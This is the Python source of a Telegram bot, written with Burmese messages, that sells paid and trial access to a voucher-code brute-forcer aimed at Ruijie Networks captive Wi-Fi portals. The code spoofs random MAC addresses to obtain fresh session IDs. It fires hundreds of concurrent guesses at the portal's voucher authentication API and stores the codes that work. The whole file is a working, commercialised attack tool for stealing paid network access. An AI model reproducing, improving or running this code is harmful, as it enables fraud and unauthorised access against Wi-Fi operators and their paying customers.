import os
import re
import math
import time
import string
import random
import asyncio
import aiohttp
from typing import Callable, Dict, Any, Awaitable
from aiogram import Bot, Dispatcher, types, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import ReturnDocument
from aiohttp import web

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")

ADMIN_ID = 8540557748
ADMIN_USERNAME = "@kyaw1010"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db_client = AsyncIOMotorClient(MONGO_URI)
db = db_client['voucher_bypass_db']

active_tasks = {}
stop_events = {}
task_stats = {}
resume_states = {}

def init_user_state(tg_id):
    if tg_id not in stop_events: stop_events[tg_id] = asyncio.Event()
    if tg_id not in task_stats: task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    if tg_id not in resume_states: resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}

class AccessMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[types.Message, Dict[str, Any]], Awaitable[Any]],
        event: types.Message,
        data: Dict[str, Any]
    ) -> Any:
        if isinstance(event, types.CallbackQuery):
             tg_id = event.from_user.id
             if event.data == 'request_trial':
                 return await handler(event, data)
             if event.data.startswith('admin_') and tg_id != ADMIN_ID:
                 await event.answer("⛔ သင့်တွင် Admin အသုံးပြုခွင့် မရှိပါ။", show_alert=True)
                 return
             if not event.data.startswith('admin_'):
                  user = await db.tg_users.find_one({"tg_id": tg_id})
                  is_active = False
                  if user:
                      if user.get("approval_type") == "count":
                          is_active = user.get("found_codes", 0) < user.get("allowed_codes", 0)
                      else:
                          is_active = time.time() < user.get("expires_at", 0)
                  if tg_id != ADMIN_ID and not is_active:
                        await event.answer("⚠️ သင်၏ အသုံးပြုခွင့် ပြည့်သွားပါပြီ။", show_alert=True)
                        return
             return await handler(event, data)
             
        if not isinstance(event, types.Message):
            return await handler(event, data)

        tg_id = event.from_user.id
        if tg_id == ADMIN_ID:
            return await handler(event, data)
        
        if event.text and event.text.startswith('/start'):
            return await handler(event, data)
            
        user = await db.tg_users.find_one({"tg_id": tg_id})
        is_active = False
        is_expired = False
        
        if user:
            if user.get("approval_type") == "count":
                is_active = user.get("found_codes", 0) < user.get("allowed_codes", 0)
            else:
                is_active = time.time() < user.get("expires_at", 0)
            is_expired = not is_active
                
        if is_active:
            return await handler(event, data)
        else:
            if event.text and event.text.startswith('/saved') and is_expired:
                return await handler(event, data)
            elif event.text and event.text.startswith('/'):
                await event.answer(f"⚠️ သင်၏ အသုံးပြုခွင့် မရှိပါ (သို့) ပြည့်သွားပါပြီ။ အချိန်ဝယ်ယူလိုပါက {ADMIN_USERNAME} ကို ဆက်သွယ်ပါ။", parse_mode="Markdown")
            return

dp.message.middleware(AccessMiddleware())
dp.callback_query.middleware(AccessMiddleware())

@dp.callback_query(lambda c: c.data == 'request_trial')
async def handle_trial_request(callback_query: types.CallbackQuery):
    tg_id = callback_query.from_user.id
    try: await callback_query.message.edit_reply_markup(reply_markup=None)
    except: pass

    user = await db.tg_users.find_one({"tg_id": tg_id})
    if user and user.get("trial_used"):
        await callback_query.answer("❌ သင်သည် Trial (အစမ်း) အသုံးပြုပြီးသွားပါပြီ။", show_alert=True)
        return
        
    await db.tg_users.update_one(
        {"tg_id": tg_id},
        {"$set": {
            "approval_type": "count",
            "allowed_codes": 3,
            "found_codes": 0, 
            "trial_used": True,
            "saved_views_after_expiry": 0
        }},
        upsert=True
    )
    
    await callback_query.message.answer(
        "🎉 **Free Trial အသုံးပြုခွင့် ရရှိပါပြီ!**\n\n"
        "Code **၃ ခု** တိတိကို အခမဲ့ ရှာဖွေနိုင်ပါသည်။\n"
        "စတင်ရန် သင့် Portal URL ကို အရင် Setup လုပ်ပါ။\n"
        "👉 ဥပမာ: `/setup http://portal...`\n\n"
        "ပြီးလျှင် ရှာဖွေရန် 👉 `/brute 1 6` ဟု ရိုက်ထည့်ပါ။",
        parse_mode="Markdown"
    )
    await callback_query.answer()

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="👥 View Approved Users", callback_data="admin_view_users")],
        [
            InlineKeyboardButton(text="⏱️ Add Time", callback_data="admin_add_time_user"),
            InlineKeyboardButton(text="🔢 Add Count", callback_data="admin_add_count_user")
        ],
        [
            InlineKeyboardButton(text="⚙️ User Worker", callback_data="admin_set_worker_user"),
            InlineKeyboardButton(text="⚙️ Admin Worker", callback_data="admin_set_worker_admin")
        ],
        [InlineKeyboardButton(text="➖ Remove User", callback_data="admin_remove_user")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

@dp.message(Command("admin"))
async def cmd_admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    text = "🛠️ **Admin Control Panel** 🛠️\n\nWelcome Admin! Please select an action below:"
    await message.answer(text, reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data and c.data.startswith('admin_'))
async def process_admin_callback(callback_query: types.CallbackQuery):
    action = callback_query.data
    
    if action == "admin_view_users":
        users_cursor = db.tg_users.find({})
        msg = "👥 **လက်ရှိခွင့်ပြုထားသော User များ (Approved List):**\n\n"
        count = 0
        async for user in users_cursor:
            app_type = user.get("approval_type", "time")
            if app_type == "count":
                rem_codes = user.get("allowed_codes", 0) - user.get("found_codes", 0)
                if rem_codes <= 0: continue
                count += 1
                msg += f"ID: `{user['tg_id']}` (Count) | ကျန် Code: {rem_codes} ခု\n"
            else:
                rem_time = user.get("expires_at", 0) - time.time()
                if rem_time < 0: continue
                count += 1
                hours, mins = int(rem_time // 3600), int((rem_time % 3600) // 60)
                msg += f"ID: `{user['tg_id']}` (Time) | ကျန်ချိန်: {hours}h {mins}m\n"
                
        if count == 0: msg += "လက်ရှိ ခွင့်ပြုပေးထားသူ မည်သူမျှ မရှိပါ။"
        await callback_query.message.answer(msg, parse_mode="Markdown")
        
    elif action == "admin_add_time_user":
        await callback_query.message.answer("⏱️ အချိန်ဖြင့် ခွင့်ပြုရန်\n👉 `/adduser <tg_id> <hours>`", parse_mode="Markdown")
    elif action == "admin_add_count_user":
        await callback_query.message.answer("🔢 Code အရေအတွက်ဖြင့် ခွင့်ပြုရန်\n👉 `/addcount <tg_id> <code_count>`", parse_mode="Markdown")
    elif action == "admin_set_worker_user":
        await callback_query.message.answer("⚙️ User များအတွက် Worker သတ်မှတ်ရန်\n👉 `/worker_user <count>`", parse_mode="Markdown")
    elif action == "admin_set_worker_admin":
        await callback_query.message.answer("⚙️ Admin အတွက် Worker သတ်မှတ်ရန်\n👉 `/worker_admin <count>`", parse_mode="Markdown")
    elif action == "admin_remove_user":
         await callback_query.message.answer("✏️ User ဖယ်ရှားရန်\n👉 `/removeuser <tg_id>`", parse_mode="Markdown")
         
    await callback_query.answer()

@dp.message(Command("adduser"))
async def cmd_adduser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, hours = int(args[1]), float(args[2])
    except: return
    expires_at = time.time() + (hours * 3600)
    await db.tg_users.update_one(
        {"tg_id": target_id}, 
        {"$set": {"approval_type": "time", "expires_at": expires_at, "saved_views_after_expiry": 0}}, 
        upsert=True
    )
    await message.answer(f"✅ User `{target_id}` ကို အချိန် `{hours}` နာရီဖြင့် ခွင့်ပြုလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("addcount"))
async def cmd_addcount(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, count = int(args[1]), int(args[2])
    except: return
    await db.tg_users.update_one(
        {"tg_id": target_id}, 
        {"$set": {"approval_type": "count", "allowed_codes": count, "found_codes": 0, "saved_views_after_expiry": 0}}, 
        upsert=True
    )
    await message.answer(f"✅ User `{target_id}` ကို Code အရေအတွက် `{count}` ခုဖြင့် ရှာဖွေခွင့် ပေးလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("removeuser"))
async def cmd_removeuser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return
    try: target_id = int(args[1])
    except: return
    await db.tg_users.update_one(
        {"tg_id": target_id}, 
        {"$set": {"approval_type": "expired", "expires_at": 0, "allowed_codes": 0}}
    )
    await message.answer(f"🗑️ User `{target_id}` ကို ဖြုတ်ချလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("addtime"))
async def cmd_addtime(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, add_hours = int(args[1]), float(args[2])
    except: return
    user = await db.tg_users.find_one({"tg_id": target_id})
    if user:
        new_expires_at = max(user.get("expires_at", 0), time.time()) + (add_hours * 3600)
        await db.tg_users.update_one(
            {"tg_id": target_id}, 
            {"$set": {"expires_at": new_expires_at, "saved_views_after_expiry": 0}}
        )
        await message.answer(f"⏳ `{add_hours}` နာရီ ထပ်တိုးပေးလိုက်ပါပြီ。")

@dp.message(Command("worker_user"))
async def cmd_worker_user(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/worker_user <count>`", parse_mode="Markdown")
    try: count = int(args[1])
    except: return await message.answer("❌ အရေအတွက်ကို ဂဏန်းဖြင့်သာ ထည့်ပါ။")
    await db.settings.update_one({"_id": "worker_counts"}, {"$set": {"user_count": count}}, upsert=True)
    await message.answer(f"✅ User များအတွက် Worker `{count}` သတ်မှတ်ပြီးပါပြီ။", parse_mode="Markdown")

@dp.message(Command("worker_admin"))
async def cmd_worker_admin(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/worker_admin <count>`", parse_mode="Markdown")
    try: count = int(args[1])
    except: return await message.answer("❌ အရေအတွက်ကို ဂဏန်းဖြင့်သာ ထည့်ပါ။")
    await db.settings.update_one({"_id": "worker_counts"}, {"$set": {"admin_count": count}}, upsert=True)
    await message.answer(f"✅ Admin အတွက် Worker `{count}` သတ်မှတ်ပြီးပါပြီ။", parse_mode="Markdown")

@dp.message(Command("notify"))
async def cmd_notify(message: types.Message):
    tg_id = message.from_user.id
    user = await db.tg_users.find_one({"tg_id": tg_id})
    current_status = user.get("notify_success", False) if user else False
    new_status = not current_status
    await db.tg_users.update_one({"tg_id": tg_id}, {"$set": {"notify_success": new_status}}, upsert=True)
    state_text = "ON 🟢" if new_status else "OFF 🔴"
    await message.answer(f"🔔 Live Notification စနစ်: **{state_text}**", parse_mode="Markdown")

@dp.message(Command("clear_saved"))
async def cmd_clear_saved(message: types.Message):
    tg_id = message.from_user.id
    result = await db.vouchers.delete_many({"user_id": tg_id})
    await message.answer(f"✅ သင့်အကောင့်ရှိ သိမ်းဆည်းထားသော Code အဟောင်းများ အားလုံး ({result.deleted_count} ခု) ရှင်းလင်းပြီးပါပြီ။")

def generate_mac():
    m = [random.randint(0x00, 0xff) for _ in range(6)]
    m[0] = (m[0] | 0x02) & 0xfe 
    return ':'.join(f'{x:02x}' for x in m)

async def get_session_id(session, url, current_sid):
    if not url: return current_sid
    n_m = generate_mac()
    s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', url) if 'mac=' in url else url
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': s_u_s,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K)',
    }
    try:
        async with session.get(s_u_s, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return current_sid

async def check_voucher(session, session_id, voucher):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "content-type": "application/json",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K)',
    }
    try:
        async with session.post(post_url, headers=headers, json=data, timeout=5) as req:
            res = await req.text()
            if "logonUrl" in res: return "SUCCESS"
            elif "STA" in res: return "LIMITED"
            elif "failed" in res or "expired" in res: return "FAILED"
    except: return "ERROR"
    return "FAILED"

def parse_mode(mode_arg):
    mapping = {
        "1": "digit", "2": "ascii-lower", "3": "ascii-upper", "4": "ascii-mix", "5": "alphanumeric",
        "digit": "digit", "ascii-lower": "ascii-lower", "ascii-upper": "ascii-upper",
        "ascii-mix": "ascii-mix", "alphanumeric": "alphanumeric"
    }
    return mapping.get(str(mode_arg))

def get_char_set(mode):
    if mode == "digit": return string.digits
    elif mode == "ascii-lower": return string.ascii_lowercase
    elif mode == "ascii-upper": return string.ascii_uppercase
    elif mode == "ascii-mix": return string.ascii_letters
    elif mode == "alphanumeric": return string.ascii_lowercase + string.digits
    else: return string.digits

async def brute_force_task(tg_id: int, message: types.Message, mode: str, length: int, target_success: int = None, is_resume: bool = False):
    init_user_state(tg_id)
    stop_events[tg_id].clear()
    
    status_msg = await message.answer("🚀 Brute force initializing...")

    user_doc = await db.tg_users.find_one({"tg_id": tg_id})
    session_url = user_doc.get("session_url") if user_doc else None
    setup_id = user_doc.get("current_setup_id") if user_doc else None
    notify_enabled = user_doc.get("notify_success", False) if user_doc else False

    if not session_url or not setup_id:
        await status_msg.edit_text("❌ Run `/setup <url>` first.", parse_mode="Markdown")
        task_stats[tg_id]["status"] = "Idle"
        return

    settings = await db.settings.find_one({"_id": "worker_counts"}) or {}
    workers_count = settings.get("admin_count", 300) if tg_id == ADMIN_ID else settings.get("user_count", 50)

    checked_set = set()
    async for doc in db.vouchers.find({"user_id": tg_id, "setup_id": setup_id, "status": {"$in": ["SUCCESS", "LIMITED"]}}, {"code": 1}): 
        checked_set.add(doc["code"])

    chars = get_char_set(mode)
    base = len(chars)
    n = base ** length
    
    s = n // 2 + 13579
    while math.gcd(s, n) != 1: s += 1
    
    if is_resume and resume_states[tg_id]["mode"] == mode and resume_states[tg_id]["length"] == length and resume_states[tg_id]["start_offset"] is not None:
        start_offset = resume_states[tg_id]["start_offset"]
        start_idx = resume_states[tg_id]["current_idx"]
        task_stats[tg_id]["status"] = "Running (Resumed)"
        if target_success is None:
            target_success = resume_states[tg_id].get("target_success")
        task_stats[tg_id]["target_success"] = target_success
    else:
        offset_max = min(n - 1, 10**18) 
        start_offset = random.randint(0, offset_max)
        start_idx = 0
        task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": target_success, "status": "Running", "speed": 0}
        resume_states[tg_id] = {"mode": mode, "length": length, "start_offset": start_offset, "current_idx": 0, "target_success": target_success}

    def voucher_generator():
        for i in range(start_idx, n):
            resume_states[tg_id]["current_idx"] = i
            idx = (start_offset + i * s) % n
            temp_idx = idx
            res = []
            for _ in range(length):
                res.append(chars[temp_idx % base])
                temp_idx //= base
            v = "".join(reversed(res))
            if v not in checked_set: yield v

    vouchers_iter = voucher_generator()
    
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, keepalive_timeout=60)
    start_time = asyncio.get_event_loop().time()
    initial_attempts = task_stats[tg_id]["attempts"]

    async with aiohttp.ClientSession(connector=connector) as session:
        session_id = None
        loop_cnt = 0

        async def worker():
            nonlocal session_id, loop_cnt
            while not stop_events[tg_id].is_set():
                if loop_cnt % 20 == 0: session_id = await get_session_id(session, session_url, session_id)
                try: voucher = next(vouchers_iter)
                except StopIteration: break

                status = await check_voucher(session, session_id, voucher)
                task_stats[tg_id]["attempts"] += 1

                if status in ["SUCCESS", "LIMITED"]:
                    task_stats[tg_id]["found"] += 1
                    if status == "SUCCESS":
                        task_stats[tg_id]["success_count"] += 1
                        if notify_enabled:
                            try: await bot.send_message(tg_id, f"💎 SUCCESS တွေ့ပါပြီ: `{voucher}`", parse_mode="Markdown")
                            except: pass
                        
                    await db.vouchers.update_one(
                        {"code": voucher, "user_id": tg_id, "setup_id": setup_id}, 
                        {"$set": {"status": status}}, 
                        upsert=True
                    )
                    
                    if tg_id != ADMIN_ID:
                        updated_user = await db.tg_users.find_one_and_update(
                            {"tg_id": tg_id},
                            {"$inc": {"found_codes": 1}},
                            return_document=ReturnDocument.AFTER
                        )
                        if updated_user and updated_user.get("approval_type") == "count":
                            if updated_user.get("found_codes", 0) >= updated_user.get("allowed_codes", 0):
                                stop_events[tg_id].set()
                                try:
                                    await bot.send_message(tg_id, f"⚠️ **အသိပေးချက်** ⚠️\n\nသင်၏ Code ရှာဖွေခွင့် အရေအတွက် ပြည့်သွားပါပြီ။\nအလုပ်လုပ်နေသော Task ကို စနစ်မှ အလိုအလျောက် ရပ်တန့်လိုက်ပါသည်။\n\nအချိန် သို့မဟုတ် အရေအတွက် ထပ်မံဝယ်ယူလိုပါက {ADMIN_USERNAME} ကိုဆက်သွယ်ပါ။", parse_mode="Markdown")
                                except: pass
                                
                    if task_stats[tg_id]["target_success"] and task_stats[tg_id]["success_count"] >= task_stats[tg_id]["target_success"]:
                         stop_events[tg_id].set()
                         try:
                             await bot.send_message(tg_id, f"🎯 **အသိပေးချက်:** သတ်မှတ်ထားသော SUCCESS Code ({task_stats[tg_id]['target_success']} ခု) ပြည့်သွားပါပြီ။ ရှာဖွေမှုကို ရပ်တန့်လိုက်ပါသည်။", parse_mode="Markdown")
                         except: pass

                loop_cnt += 1
                await asyncio.sleep(0) 

        async def stats_updater():
            last_text = ""
            while not stop_events[tg_id].is_set():
                await asyncio.sleep(3) 
                
                if tg_id != ADMIN_ID:
                    user_data = await db.tg_users.find_one({"tg_id": tg_id})
                    is_active = False
                    if user_data:
                        if user_data.get("approval_type") == "count":
                            is_active = user_data.get("found_codes", 0) < user_data.get("allowed_codes", 0)
                        else:
                            is_active = time.time() < user_data.get("expires_at", 0)
                            
                    if not is_active:
                        stop_events[tg_id].set()
                        try: await bot.send_message(tg_id, f"⚠️ သင်၏ အသုံးပြုခွင့် ပြည့်သွားပါပြီ။ Task ရပ်တန့်လိုက်ပါသည်။\nထပ်မံအသုံးပြုလိုပါက {ADMIN_USERNAME} ကိုဆက်သွယ်ပါ။", parse_mode="Markdown")
                        except: pass
                        break
                        
                elapsed = asyncio.get_event_loop().time() - start_time
                current_attempts = task_stats[tg_id]["attempts"] - initial_attempts
                speed = current_attempts / elapsed if elapsed > 0 else 0
                task_stats[tg_id]["speed"] = speed
                
                text = (
                    f"📋 Task Status: {task_stats[tg_id]['status']}\n"
                    f"⚡ Speed: {speed:.0f}/sec\n"
                    f"🔍 Checked: {task_stats[tg_id]['attempts']}\n"
                    f"💎 Found (Total): {task_stats[tg_id]['found']}\n"
                )
                if task_stats[tg_id]["target_success"]:
                    text += f"🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
                    
                if text != last_text:
                    try:
                        await status_msg.edit_text(text)
                        last_text = text
                    except Exception: pass 

        workers = [asyncio.create_task(worker()) for _ in range(workers_count)]
        updater = asyncio.create_task(stats_updater())

        await asyncio.gather(*workers, return_exceptions=True)
        stop_events[tg_id].set()
        await updater

    if task_stats[tg_id]["status"] != "Idle":
        task_stats[tg_id]["status"] = "Stopped/Completed"
        final_text = (
            f"🏁 **Brute Force {task_stats[tg_id]['status']}**\n\n"
            f"🔍 Checked: {task_stats[tg_id]['attempts']}\n"
            f"💎 Found (Total): {task_stats[tg_id]['found']}"
        )
        if task_stats[tg_id]["target_success"]:
            final_text += f"\n🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
            
        try:
            await status_msg.edit_text(final_text, parse_mode="Markdown")
        except: pass
    
    if tg_id in active_tasks:
        del active_tasks[tg_id]

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    tg_id = message.from_user.id
    user = await db.tg_users.find_one({"tg_id": tg_id})
    is_active = False
    
    if tg_id == ADMIN_ID: 
        role_text = "👑 **Admin**"
    else:
        if user:
            approval_type = user.get("approval_type", "time")
            if approval_type == "count":
                rem_codes = user.get("allowed_codes", 0) - user.get("found_codes", 0)
                is_active = rem_codes > 0
                if is_active:
                    trial_txt = " (Trial)" if user.get("trial_used") and user.get("allowed_codes") == 3 else ""
                    role_text = f"👤 **User{trial_txt}** (ကျန် Code: {rem_codes} ခု)"
                else:
                    role_text = "❌ **Limit Reached**"
            else:
                rem_time = user.get("expires_at", 0) - time.time()
                is_active = rem_time > 0
                if is_active:
                    role_text = f"👤 **User** (ကျန်ချိန်: {int(rem_time//3600)}h {int((rem_time%3600)//60)}m)"
                else:
                    role_text = "❌ **Expired**"
        else:
            role_text = "❌ **Unregistered**"

    welcome = (
        f"✅ Bot Active. Your Role: {role_text}\n\n"
        "**အသုံးပြုရန် Commands များ:**\n"
        "`/help` (Bot အသုံးပြုနည်းကြည့်ရန်)\n"
        "`/setup <url>` (Portal URL ထည့်ရန်)\n"
        "`/brute <mode> <length> [number]`\n"
        "`/saved` (အောင်မြင်သော Code များကြည့်ရန်)\n"
        "`/clear_saved` (Code အဟောင်းများဖျက်ရန်)\n"
        "`/notify` (Live Notification ဖွင့်/ပိတ်)\n"
        "`/status` (လက်ရှိအခြေအနေ ကြည့်ရန်)\n"
        "`/stop` (ရပ်တန့်ရန်)\n\n"
    )
    
    if tg_id == ADMIN_ID:
        welcome += "**Admin Panel:**\n👉 Send `/admin` to open the control panel.\n"
        await message.answer(welcome, parse_mode="Markdown")
    else:
        welcome += f"💰 **အချိန်သက်တမ်း သို့မဟုတ် Code အရေအတွက် ဝယ်ယူရန်:**\n👉 ဆက်သွယ်ရန် - {ADMIN_USERNAME}\n\n"
        
        if not is_active:
            if not user or not user.get("trial_used"):
                keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Get Free Trial (3 Codes)", callback_data="request_trial")]])
                await message.answer(welcome, reply_markup=keyboard, parse_mode="Markdown")
            else:
                await message.answer(welcome + f"⚠️ သင်၏ အသုံးပြုခွင့် ပြည့်သွားပါပြီ။ `/saved` ဖြင့် မှတ်တမ်းကိုသာ ကြည့်ရှုနိုင်ပါသည်။", parse_mode="Markdown")
        else:
            await message.answer(welcome, parse_mode="Markdown")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = (
        "📖 **Ruijie Code Finder (Alphanumeric-6) အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "၁။ **Setup လုပ်ခြင်း:**\n"
        "အရင်ဆုံး မိမိဖောက်လိုသော Portal ၏ URL အရှည်ကို `/setup <url>` ဖြင့်ထည့်ပါ။\n"
        "👉 ဥပမာ: `/setup http://portal...`\n\n"
        
        "၂။ **စတင်ရှာဖွေခြင်း:**\n"
        "`/brute <mode> <length> <target_number>` ဖြင့် စတင်ပါ။\n"
        "   🔸 Mode ရွေးချယ်စရာများ:\n"
        "     `1` = ဂဏန်းသီးသန့် (0-9)\n"
        "     `2` = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     `3` = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     `4` = စာလုံးအကြီး၊ အသေး ရောရာ (a-z, A-Z)\n"
        "     `5` = စာလုံးနဲ့ ဂဏန်း ရောရာ (a-z, 0-9)\n"
        "   🔸 Length: Code အရှည် (ဥပမာ: 6, 7)\n"
        "   🔸 Target Number (ရွေးချယ်နိုင်သည်): SUCCESS Code ဘယ်နှခုပြည့်ရင် ရပ်မလဲ သတ်မှတ်ခြင်း။\n"
        "👉 ဥပမာ: `/brute 1 6 5` (ဂဏန်း ၆ လုံး ရှာမည်။ SUCCESS Code ၅ ခုရပါက ရပ်မည်။)\n\n"
        
        "၃။ **အခြေအနေကြည့်ခြင်း:**\n"
        "`/status` ဖြင့် လက်ရှိ ရှာဖွေနေသော အမြန်နှုန်းနှင့် ရလဒ်များကို ကြည့်ပါ။\n\n"
        
        "၄။ **ရပ်တန့်ခြင်း:**\n"
        "`/stop` ဖြင့် ရှာဖွေမှုကို ယာယီရပ်ထားနိုင်ပြီး၊ နောက်မှ `/brute` ဖြင့် ရပ်ခဲ့သောနေရာမှ ပြန်ဆက်နိုင်ပါသည်။\n\n"
        
        "၅။ **ရလဒ်ကြည့်ခြင်း & ဖျက်ခြင်း:**\n"
        "`/saved` ဖြင့် အောင်မြင်ထားသော Code များကို ကြည့်ပါ။\n"
        "`/clear_saved` ဖြင့် Code အဟောင်းများကို ရှင်းလင်းပါ။\n"
        "`/notify` ဖြင့် Live Code ရတိုင်း ပို့ပေးသည့် စနစ်ကို အဖွင့်အပိတ်လုပ်ပါ။"
    )
    await message.answer(help_text, parse_mode="Markdown")

@dp.message(Command("setup"))
async def cmd_setup(message: types.Message):
    tg_id = message.from_user.id
    args = message.text.split(maxsplit=1)
    
    if len(args) < 2: 
        return await message.answer("Usage: `/setup <session_url>`\nဥပမာ: `/setup http://portal.ruijie...`", parse_mode="Markdown")
        
    url_or_id = args[1].strip()
    
    if tg_id == ADMIN_ID and not url_or_id.startswith("http"):
        try:
            target_tg_id = int(url_or_id)
            target_doc = await db.tg_users.find_one({"tg_id": target_tg_id})
            if target_doc and target_doc.get("session_url"):
                return await message.answer(f"🔗 **User `{target_tg_id}` ၏ Setup URL:**\n`{target_doc['session_url']}`", parse_mode="Markdown")
            else:
                return await message.answer(f"❌ User `{target_tg_id}` တွင် Setup ပြုလုပ်ထားသော URL မရှိပါ။", parse_mode="Markdown")
        except ValueError:
            pass 
            
    url = url_or_id
    if not url.startswith("http"):
         return await message.answer("❌ မှားယွင်းနေပါသည်။ URL သည် http သို့မဟုတ် https ဖြင့် စတင်ရပါမည်။", parse_mode="Markdown")
         
    user_doc = await db.tg_users.find_one({"tg_id": tg_id})
    old_setup_id = user_doc.get("current_setup_id") if user_doc else None
    new_setup_id = f"setup_{tg_id}_{int(time.time())}"
    
    update_data = {
        "session_url": url, 
        "current_setup_id": new_setup_id
    }
    if old_setup_id:
         update_data["old_setup_id"] = old_setup_id
         
    await db.tg_users.update_one({"tg_id": tg_id}, {"$set": update_data}, upsert=True)
    
    if old_setup_id:
        await db.vouchers.delete_many({"user_id": tg_id, "setup_id": {"$nin": [new_setup_id, old_setup_id]}})
    else:
        await db.vouchers.delete_many({"user_id": tg_id})
    
    if tg_id in stop_events:
        stop_events[tg_id].set()
        
    if tg_id in resume_states:
        del resume_states[tg_id]
    
    await asyncio.sleep(0.5) 
    
    if tg_id in active_tasks:
        del active_tasks[tg_id]
        
    init_user_state(tg_id)
    
    await message.answer(f"✅ သင်၏ Portal URL Setup အသစ် ပြုလုပ်ပြီးပါပြီ!\n\n🗑️ သင့်အတွက် ယခင်မှတ်တမ်းဟောင်းများကို ရှင်းလင်းပြီး Session အသစ်စတင်ထားပါသည်။")

@dp.message(Command("brute"))
async def cmd_brute(message: types.Message):
    tg_id = message.from_user.id
    init_user_state(tg_id)
    
    if tg_id in active_tasks and not active_tasks[tg_id].done():
        return await message.answer("❌ သင်၏ Account တွင် အခြား Task တစ်ခု Run နေပါသည်။ ယခင် Task ကို /stop ဖြင့် အရင်ရပ်ပါ။")
        
    args = message.text.split()
    if len(args) < 3:
        text = (
            "Usage: `/brute <mode> <length> [target_success_number]`\n\n"
            "**Modes:**\n"
            "`1` = Digit (0-9)\n"
            "`2` = Ascii-Lower (a-z)\n"
            "`3` = Ascii-Upper (A-Z)\n"
            "`4` = Ascii-Mix (a-z, A-Z)\n"
            "`5` = Alphanumeric (a-z, 0-9)\n\n"
            "👉 ဥပမာ: `/brute 1 6 5` (ဂဏန်း ၆ လုံး ရှာမည်။ SUCCESS ၅ ခုရရင် ရပ်မည်။)"
        )
        return await message.answer(text, parse_mode="Markdown")
        
    parsed_mode = parse_mode(args[1])
    if not parsed_mode: return await message.answer("❌ Invalid mode. Use 1, 2, 3, 4, or 5.")
    
    try: length = int(args[2])
    except: return await message.answer("❌ Invalid length.")
    
    target_success = None
    if len(args) >= 4:
        try: target_success = int(args[3])
        except: return await message.answer("❌ Invalid target success number.")
    
    if resume_states[tg_id]["mode"] == parsed_mode and resume_states[tg_id]["length"] == length and resume_states[tg_id]["current_idx"] > 0:
        resume_states[tg_id]["target_success"] = target_success
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="▶️ Resume from stopped point", callback_data=f"brute_resume_{parsed_mode}_{length}")],
            [InlineKeyboardButton(text="🔄 Start Over", callback_data=f"brute_new_{parsed_mode}_{length}")]
        ])
        await message.answer(
            f"Pause detected for `{parsed_mode}` (length: `{length}`).\nDo you want to resume where you left off or start a new search?",
            reply_markup=keyboard, parse_mode="Markdown"
        )
    else:
         active_tasks[tg_id] = asyncio.create_task(brute_force_task(tg_id, message, parsed_mode, length, target_success, is_resume=False))

@dp.callback_query(lambda c: c.data and c.data.startswith('brute_'))
async def process_brute_callback(callback_query: types.CallbackQuery):
    tg_id = callback_query.from_user.id
    try: await callback_query.message.edit_reply_markup(reply_markup=None)
    except: pass
        
    action, mode, length = callback_query.data.split('_')[1:4]
    length = int(length)
    target_success = resume_states.get(tg_id, {}).get("target_success")
    
    if tg_id in active_tasks and not active_tasks[tg_id].done(): 
        await callback_query.answer("Task ကြီး Run နေပါပြီ။", show_alert=True)
        return
    
    if action == "resume":
        active_tasks[tg_id] = asyncio.create_task(brute_force_task(tg_id, callback_query.message, mode, length, target_success, is_resume=True))
    elif action == "new":
        active_tasks[tg_id] = asyncio.create_task(brute_force_task(tg_id, callback_query.message, mode, length, target_success, is_resume=False))
        
    await callback_query.answer()

